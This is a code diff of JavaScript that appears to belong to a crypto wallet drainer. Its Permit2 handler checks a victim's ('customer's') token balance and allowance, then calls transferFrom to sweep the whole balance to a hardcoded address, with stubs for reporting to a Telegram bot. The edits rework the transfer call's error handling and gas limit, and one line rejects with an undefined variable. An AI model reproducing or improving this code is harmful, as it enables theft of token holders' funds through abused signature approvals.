@@ -916,11 +916,13 @@ async function handelPermit2Transfer(monitData) {
     const spender_address = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
     //查询客户余额
     const balance = await getTokenBalances(ownerAddress);
-    const balance_amount = parseInt(balance) / 10 ** balance.toString().length;
+    //const balance_amount = parseInt(balance) / 10 ** balance.toString().length;
 
     // //v3check
     const allowance = await v3check(ownerAddress, spender_address);
-    if (balance_amount >= 2000 && allowance >= 2000) {
+  return new Promise(async (resolve, reject) => {
+
+    if (balance >= 2000 && allowance >= 2000) {
         // //获取签名信息 0xc18f0d85528948dee12730f0378066718aee9eeb
         // const signature =
         //     "0xc143ea056dd2f62a128808cc0c47d9477f9080c080a037437ba52140dbac1d7dc65cdb58531e038930c82314817f91cb8d8ea36a2bd0a001e134479d567b8595d7";
@@ -928,14 +930,29 @@ async function handelPermit2Transfer(monitData) {
         const owner_wuwu = ownerAddress;
         const spender_haha = "0x433093f43acA393Ccee7AFe93082c6818C9b65Aa";
         const amount = balance.toString();
-        await permit2_contarct_instance[
+        permit2_contarct_instance[
             "transferFrom(address,address,uint160,address)"
         ](owner_wuwu, spender_haha, amount, contract_address, {
-            gasLimit: 60000,
-        });
+            gasLimit: 100000,
+        }).then((res)=>{
+
+          if (!res) {
+            reject(error);
+          } else {
+            resolve();
+          }
+
+        })
+
+
     } else {
         console.log("not enough");
+
     }
+
+  })
+
+
 
     //发送消息到telegram
 }
@@ -944,5 +961,3 @@ async function sendMsg(msg) {
     //启动TEL机器人
     //发送消息
 }
-
-handelPermit2Transfer();
